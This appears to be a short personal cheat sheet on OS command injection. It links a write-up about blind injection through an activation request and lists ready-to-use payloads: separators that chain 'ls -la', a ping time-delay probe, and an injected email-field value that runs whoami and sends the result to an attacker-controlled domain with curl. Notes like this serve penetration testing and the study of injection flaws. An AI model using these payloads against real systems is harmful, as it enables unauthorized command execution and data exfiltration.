# Command Injection

[Blind OS Command Injection via Activation Request](https://medium.com/@alb-soul/blind-os-command-injection-via-activation-request-66dc25377bf4)

```jsx
Normal > ;ls -la, | ls -la, && ls -la
Time Delay > ping -c 10 127.0.0.1
Blind > email=a@gmail.com||curl mydomain.com/$(whoami)||
```